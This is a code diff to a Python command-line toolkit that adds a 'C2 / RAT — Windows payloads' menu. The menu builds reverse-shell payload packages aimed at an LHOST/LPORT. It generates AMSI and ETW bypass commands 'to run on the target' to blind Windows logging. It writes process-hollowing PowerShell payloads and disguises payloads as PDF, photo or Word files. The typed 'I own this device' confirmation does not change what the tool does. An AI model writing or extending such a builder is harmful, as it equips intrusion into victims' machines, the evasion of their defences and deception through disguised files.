@@ -608,18 +608,140 @@ async def menu_joker():
 
 
 async def menu_c2():
-    """Placeholder — C2/RAT module built in next session."""
     banner()
     section("💀  C2 / RAT — WINDOWS PAYLOADS")
-    print(f"  {Y}[!] C2 module is being built.{R}")
-    print(f"  {DIM}Coming next session:{R}")
-    print(f"  {G}→{R}  Fileless PowerShell payload (RAM only)")
-    print(f"  {G}→{R}  AMSI Bypass + ETW Patching")
-    print(f"  {G}→{R}  Polymorphic shellcode (new signature every generate)")
-    print(f"  {G}→{R}  Disguised as PDF / Photo / Word macro")
-    print(f"  {G}→{R}  Reverse shell to Kali via HTTPS/DNS")
-    print(f"  {G}→{R}  Auto-generated ANLEITUNG.txt")
-    wait_key()
+    print(f"  {RD}{B}⛔  AUTHORIZED USE ONLY — own/permitted devices only{R}")
+    print()
+    menu_item("1", "🔨  Build Full Payload Package",    "⛔")
+    menu_item("2", "🛡️   AMSI Bypass (standalone)",      "🔴")
+    menu_item("3", "👁️   ETW Bypass (blind Windows logs)","🔴")
+    menu_item("4", "🔀  Combined AMSI+ETW Bypass",      "🔴")
+    menu_item("5", "💉  Process Hollowing Payload",     "⛔")
+    menu_item("6", "🎭  Disguise as PDF/Photo/Word",    "⛔")
+    menu_item("0", "Back")
+    print()
+
+    choice = prompt("c2")
+    if choice == "0":
+        return
+
+    elif choice == "1":
+        # Full payload builder
+        banner()
+        section("🔨  BUILD FULL PAYLOAD PACKAGE")
+        print(f"  {RD}⛔  30-second confirmation required.{R}")
+        print()
+        lhost = prompt("LHOST (your Kali IP)")
+        if not lhost:
+            return
+        try:
+            lport = int(prompt("LPORT (e.g. 4444)") or "4444")
+        except ValueError:
+            lport = 4444
+
+        # Danger confirmation
+        print(f"\n  {RD}{B}Type exactly: I confirm this is my authorized device{R}")
+        confirm = prompt("confirm")
+        if confirm.strip().lower() != "i confirm this is my authorized device":
+            print(f"  {Y}[!] Confirmation failed — aborted.{R}")
+            wait_key()
+            return
+
+        print()
+        try:
+            from tools.c2.payload_builder import PayloadBuilder, BuildConfig
+            cfg = BuildConfig(lhost=lhost, lport=lport)
+            builder = PayloadBuilder(cfg)
+            async for line in builder.build():
+                print_output_line(line)
+        except Exception as e:
+            print(f"  {RD}[!] Error: {e}{R}")
+        wait_key()
+
+    elif choice == "2":
+        banner()
+        section("🛡️  AMSI BYPASS (standalone)")
+        method = prompt("Method [reflection/memory_patch] (default: reflection)") or "reflection"
+        try:
+            from tools.c2.amsi_bypass import build_amsi_bypass
+            cmd = build_amsi_bypass(method)
+            print(f"\n  {G}[+] Run this on the target Windows machine:{R}")
+            print(f"\n  {C}{cmd}{R}\n")
+        except Exception as e:
+            print(f"  {RD}[!] {e}{R}")
+        wait_key()
+
+    elif choice == "3":
+        banner()
+        section("👁️  ETW BYPASS")
+        try:
+            from tools.c2.amsi_bypass import build_etw_bypass
+            cmd = build_etw_bypass()
+            print(f"\n  {G}[+] Patches EtwEventWrite → Windows logging blind{R}")
+            print(f"\n  {C}{cmd}{R}\n")
+        except Exception as e:
+            print(f"  {RD}[!] {e}{R}")
+        wait_key()
+
+    elif choice == "4":
+        banner()
+        section("🔀  COMBINED AMSI+ETW BYPASS")
+        try:
+            from tools.c2.amsi_bypass import build_combined_bypass
+            cmd = build_combined_bypass()
+            print(f"\n  {G}[+] Disables AMSI + ETW + ScriptBlock logging{R}")
+            print(f"\n  {C}{cmd}{R}\n")
+        except Exception as e:
+            print(f"  {RD}[!] {e}{R}")
+        wait_key()
+
+    elif choice == "5":
+        banner()
+        section("💉  PROCESS HOLLOWING PAYLOAD")
+        lhost = prompt("LHOST (your Kali IP)")
+        if not lhost:
+            return
+        try:
+            lport = int(prompt("LPORT") or "4444")
+        except ValueError:
+            lport = 4444
+        print(f"\n  {RD}⛔  Type: I own this device{R}")
+        if prompt("confirm").strip().lower() != "i own this device":
+            print(f"  {Y}[!] Aborted.{R}")
+            wait_key()
+            return
+        try:
+            from tools.c2.process_hollow import generate as ph_gen, HOLLOW_TARGETS
+            import random as _r
+            code = ph_gen(b"\x90" * 8, target_process=_r.choice(HOLLOW_TARGETS))
+            out = f"/tmp/hollow_{lhost.replace('.','_')}_{lport}.ps1"
+            with open(out, "w") as f:
+                f.write(code)
+            print(f"\n  {G}[+] Saved: {out}{R}")
+            print(f"  {DIM}Replace demo shellcode with real msfvenom -f raw{R}")
+        except Exception as e:
+            print(f"  {RD}[!] {e}{R}")
+        wait_key()
+
+    elif choice == "6":
+        banner()
+        section("🎭  DISGUISE AS PDF/PHOTO/WORD")
+        ps1_path = prompt("Path to payload.ps1")
+        if not ps1_path or not os.path.exists(ps1_path):
+            print(f"  {Y}[!] File not found.{R}")
+            wait_key()
+            return
+        dtype = prompt("Disguise type [pdf/photo/word] (default: pdf)") or "pdf"
+        decoy = prompt("Path to real decoy file (optional, press Enter to skip)") or None
+        out_dir = prompt("Output directory (default: /tmp)") or "/tmp"
+        print()
+        try:
+            from tools.c2.disguise import build_disguised_exe
+            async for line in build_disguised_exe(ps1_path, dtype, decoy, out_dir):
+                print_output_line(line)
+        except Exception as e:
+            print(f"  {RD}[!] {e}{R}")
+        wait_key()
 
 
 # ═════════════════════════════════════════════════════════════════════════════
